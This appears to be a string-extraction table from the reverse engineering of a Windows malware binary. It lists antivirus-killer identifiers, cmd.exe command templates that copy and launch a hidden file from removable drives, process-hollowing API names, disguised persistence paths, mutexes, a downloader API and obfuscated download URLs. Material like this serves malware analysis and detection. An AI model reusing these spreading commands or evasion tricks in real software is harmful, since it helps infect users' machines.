reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x403cdc	0x4013c4	string	0x403cd0	dwwin.exe
0x403d11	0x4013d0	string	0x403d00	protectaavprotector_c0009X00
0x403d5b	0x4013f0	string	0x403d50	IsWow64Process
0x403d60	0x401400	string	0x403d50	kernel32.dll
0x403d7f	0x401410	string	0x403d50	AAVkillllerrrsdadc0009X00
0x403f39	0x401430	string	0x403e80	.exe
0x4041c6	0x40143c	string	0x4041c0	iphlpapi.dll
0x4041d4	0x40144c	string	0x4041c0	GetExtendedTcpTable
0x4041e6	0x401460	string	0x4041c0	GetOwnerModuleFromTcpEntry
0x4045dc	0x401510	string	0x4045b0	{A5DCBF10-6530-11D2-901F-00C04FB951ED}
0x40473d	0x401560	string	0x404730	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
0x4047f0	0x40159c	string	0x4047a0	CoInitializeEx
0x4047f5	0x4015ac	string	0x4047a0	ole32.dll
0x40488b	0x4015b8	string	0x4047a0	/c "%%SystemRoot%%\explorer.exe %%cd%%%s & attrib -s -h %%cd%%%s & xcopy /F /S /Q /H /R /Y %%cd%%%s %%temp%%\%s\ & attrib +s +h %%cd%%%s & start %%temp%%\%s\%s & exit"
0x4048be	0x401660	string	0x4047a0	/c "start %%cd%%%s & attrib -s -h %%cd%%%s & xcopy /F /S /Q /H /R /Y %%cd%%%s %%temp%%\%s\ & attrib +s +h %%cd%%%s & start %%temp%%\%s\%s & exit"
0x4048d3	0x4016f4	string	0x4047a0	%ALLUSERSPROFILE%\..\..\windows\system32\cmd.exe
0x404905	0x401728	string	0x4047a0	%SystemRoot%\system32\SHELL32.dll
0x40491c	0x40174c	string	0x4047a0	%SystemRoot%\system32\SHELL32.dll
0x4049e0	0x401770	string	0x4049d0	BCDEFGHIJKLMNOPQRSTUVWXYZ
0x4049f4	0x40178c	string	0x4049d0	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
0x404a4a	0x4017c4	string	0x4049d0	%s\c731200
0x404b2c	0x4017d0	string	0x4049d0	%s\c731200
0x404c05	0x4017dc	string	0x4049d0	.exe
0x404c1e	0x4017e4	string	0x4049d0	%s\*
0x404da7	0x4017ec	string	0x4049d0	%s\%s
0x404dca	0x4017f4	string	0x4049d0	%s\%s
0x404e13	0x4017fc	string	0x4049d0	%s\%s.lnk
0x404e36	0x401808	string	0x4049d0	%s\%s
0x404e4b	0x401810	string	0x4049d0	.lnk
0x404e8a	0x401818	string	0x4049d0	.exe
0x404ea0	0x401820	string	0x4049d0	.pif
0x404eb6	0x401828	string	0x4049d0	.scr
0x404ecc	0x401830	string	0x4049d0	.cmd
0x404ee2	0x401838	string	0x4049d0	.com
0x40501b	0x401840	string	0x4049d0	%s\%s
0x405351	0x40535d	string	0x405340	jjjj
0x40537a	0x401848	string	0x405340	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890123456789
0x40540f	0x401894	string	0x4053f0	HOMEDRIVE
0x40541a	0x4018a0	string	0x4053f0	\Program Files\
0x40565a	0x4018b8	string	0x405610	IsWow64Process
0x40565f	0x4018c8	string	0x405610	kernel32.dll
0x405676	0x4018d8	string	0x405610	-aav_start
0x405696	0x4018e4	string	0x405610	-shell
0x4056b8	0x4018ec	string	0x405610	Windows_Shared_Mutex_231_c0009X00
0x4056f0	0x401910	string	0x405610	CFlagc0009X00
0x4057b8	0x401920	string	0x405610	\mspaint.exe
0x4057c8	0x40193c	string	0x405610	SVCHOST_MUTEX_OBJECT_RELEASED_c0009X00
0x4057d8	0x401964	string	0x405610	kernel32.dll
0x4057e6	0x401974	string	0x405610	CreateProcessW
0x4057fa	0x401984	string	0x405610	GetProcessVersion
0x40580e	0x401998	string	0x405610	Sleep
0x405822	0x4019a0	string	0x405610	CreateMutexA
0x405836	0x4019b0	string	0x405610	ExitProcess
0x40584a	0x4019bc	string	0x405610	SetLastError
0x40585e	0x4019cc	string	0x405610	GetLastError
0x4058cf	0x4019dc	string	0x405610	\svchost.exe
0x405a65	0x4019fc	string	0x4059f0	NtUnmapViewOfSection
0x405a6a	0x401a14	string	0x4059f0	ntdll.dll
0x405c14	0x401a20	string	0x405be0	\ScreenSaverPro.scr
0x405c70	0x401a34	string	0x405be0	\temp.bin
0x405d0b	0x401a40	string	0x405cb0	user32.dll
0x405d16	0x401a4c	string	0x405cb0	advapi32.dll
0x405d21	0x401a5c	string	0x405cb0	shell32.dll
0x405d2c	0x401a68	string	0x405cb0	urlmon.dll
0x405d37	0x401a74	string	0x405cb0	wininet.dll
0x405d42	0x401a80	string	0x405cb0	gdi32.dll
0x405d4d	0x401a8c	string	0x405cb0	rpcrt4.dll
0x405d58	0x401a98	string	0x405cb0	netapi32.dll
0x405d93	0x401aa8	string	0x405cb0	USBProc
0x405deb	0x401ab4	string	0x405cb0	USBProc
0x40626a	0x401ac4	string	0x4061a0	.gonewiththewings
0x4062f1	0x401ad8	string	0x4062d0	*.exe
0x406366	0x401ae0	string	0x4062d0	.gonewiththewings
0x4063d0	0x401af4	string	0x4063c0	*.gonewiththewings
0x40664c	0x401b0c	string	0x406630	\WindowsUpdate\Updater.exe
0x406703	0x401b28	string	0x406630	\*.*
0x4067a8	0x401b34	string	0x406630	%s\%s
0x40690e	0x406923	string	0x4068b0	h<\e@
0x406923	0x401b3c	string	0x4068b0	\CreativeAudio
0x406988	0x401b4c	string	0x4068b0	\Microsoft
0x406a28	0x401b58	string	0x4068b0	\Microsoft\Windows
0x406a81	0x401b6c	string	0x4068b0	\bett2f002
0x406ada	0x401b78	string	0x4068b0	\CreativeAudio
0x406b33	0x401b88	string	0x4068b0	\Identities
0x406de3	0x401b94	string	0x406d70	\bett2f002
0x406e48	0x401ba0	string	0x406d70	\Microsoft\Windows
0x406ea1	0x401bb4	string	0x406d70	\Microsoft
0x406efa	0x401bc0	string	0x406d70	\bett2f002
0x406f53	0x401bcc	string	0x406d70	\CreativeAudio
0x406fac	0x401bdc	string	0x406d70	\Identities
0x4071bf	0x401be8	string	0x407180	\Microsoft
0x407266	0x401bf4	string	0x407180	\Identities
0x407304	0x401c00	string	0x407180	ALLUSERSPROFILE
0x407460	0x401c10	string	0x407180	%s\Program Files\Common Files
0x407475	0x401c30	string	0x407180	\bett2f002
0x407561	0x401c40	string	0x407180	%s\programdata
0x407576	0x401c50	string	0x407180	\bett2f002
0x407621	0x401c5c	string	0x407180	%s\Program Files\Common Files
0x407636	0x401c7c	string	0x407180	\CreativeAudio
0x407722	0x401c90	string	0x407180	%s\programdata
0x407737	0x401ca0	string	0x407180	\CreativeAudio
0x4078d9	0x401cb4	string	0x407180	\adobe
0x407bbc	0x401cc0	string	0x407b20	*.exe
0x407c1d	0x401cc8	string	0x407b20	.gonewiththewings
0x407c90	0x401cdc	string	0x407c80	*.gonewiththewings
0x40865b	0x401cf0	string	0x408650	kernel32.dll
0x40867b	0x401d00	string	0x408650	abcdefghijklmnopqrstuvwxyz0123456789
0x40869c	0x401d28	string	0x408650	SSLOADasdasc000900
0x408716	0x401d3c	string	0x408650	CloseHandle
0x40872e	0x401d48	string	0x408650	CreateFileA
0x408746	0x401d54	string	0x408650	DeleteFileA
0x40875e	0x401d60	string	0x408650	ExitProcess
0x408776	0x401d6c	string	0x408650	GetFileSize
0x40878e	0x401d78	string	0x408650	GetProcAddress
0x4087a6	0x401d88	string	0x408650	GetSystemTime
0x4087be	0x401d98	string	0x408650	GetTempPathA
0x4087d6	0x401da8	string	0x408650	LoadLibraryA
0x4087ee	0x401db8	string	0x408650	lstrcatA
0x408806	0x401dc4	string	0x408650	lstrlenA
0x40881e	0x401dd0	string	0x408650	ReadFile
0x408836	0x401ddc	string	0x408650	SetFileAttributesA
0x40884e	0x401df0	string	0x408650	WinExec
0x408866	0x401df8	string	0x408650	WriteFile
0x40887e	0x401e04	string	0x408650	Sleep
0x408896	0x401e0c	string	0x408650	GetLastError
0x4088ae	0x401e1c	string	0x408650	CreateMutexA
0x4088d8	0x401e2c	string	0x408650	c731200
0x40890e	0x401e38	string	0x408650	user32.dll
0x408920	0x401e44	string	0x408650	urlmon.dll
0x408932	0x401e50	string	0x408650	wsprintfA
0x408944	0x401e5c	string	0x408650	URLDownloadToFileA
0x408956	0x401e70	string	0x408650	wininet.dll
0x408968	0x401e7c	string	0x408650	InternetCheckConnectionA
0x40897a	0x401e98	string	0x408650	http://www.google.com
0x408a17	0x401eb0	string	0x408650	.exe
0x408a49	0x401eb8	string	0x408650	c731200
0x408a5b	0x401ec0	string	0x408650	9EEAi^^2A:`]H:A>2?:2]4@>]H:A>D4]CF^2A:`]8:7
0x408a6d	0x401eec	string	0x408650	9EEAi^^2A:a]H:A>2?:2]4@>]H:A>D4]CF^2A:a]8:7
0x408a7f	0x401f18	string	0x408650	9EEAi^^2A:b]H:A>2?:2]4@>]H:A>D4]CF^2A:b]8:7
0x408a91	0x401f44	string	0x408650	9EEAi^^2A:c]H:A>2?:2]4@>]H:A>D4]CF^2A:c]8:7
0x408aa3	0x401f70	string	0x408650	9EEAi^^2A:d]H:A>2?:2]4@>]H:A>D4]CF^2A:d]8:7
0x408ab5	0x401f9c	string	0x408650	9EEAi^^2A:e]H:A>2?:2]4@>]H:A>D4]CF^2A:e]8:7
